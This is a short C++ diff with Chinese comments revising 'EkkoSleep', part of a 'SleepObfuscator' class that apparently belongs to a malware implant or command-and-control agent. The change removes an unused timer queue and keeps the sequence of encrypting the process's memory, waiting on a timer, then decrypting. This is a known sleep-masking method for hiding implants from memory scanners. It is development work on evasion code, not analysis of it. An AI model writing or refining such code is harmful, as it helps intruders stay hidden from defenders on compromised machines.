@@ -162,20 +162,16 @@ void SleepObfuscator::EkkoSleep(DWORD milliseconds) {
         return;
     }
 
-    HANDLE hTimerQueue = CreateTimerQueue();
-    if (!hTimerQueue) {
-        ObfuscatedSleep(milliseconds);
-        return;
-    }
+    // ★ v3.38 FIX: 移除冗余的 CreateTimerQueue — 它创建内核线程池
+    //   但我们不使用任何 timer callback, 线程池纯属浪费且可能引发未知行为
+    //   直接使用 EncryptAll → WaitableTimer → DecryptAll 即可
 
     // ★ v3.37: EncryptAll/DecryptAll 已安全化 (检查 VirtualProtect 返回值)
-    //   加密/解密失败时自动跳过无法修改的页面, 不会崩溃
     EncryptAll();
 
     HANDLE hWaitableTimer = CreateWaitableTimerW(nullptr, TRUE, nullptr);
     if (!hWaitableTimer) {
-        DecryptAll();
-        DeleteTimerQueueEx(hTimerQueue, nullptr);
+        DecryptAll();  // 加密后必须解密, 否则内存处于损坏状态
         ObfuscatedSleep(milliseconds);
         return;
     }
@@ -189,7 +185,6 @@ void SleepObfuscator::EkkoSleep(DWORD milliseconds) {
     DecryptAll();
 
     CloseHandle(hWaitableTimer);
-    DeleteTimerQueueEx(hTimerQueue, nullptr);
 }
 
 void SleepObfuscator::FoliageSleep(DWORD milliseconds) {
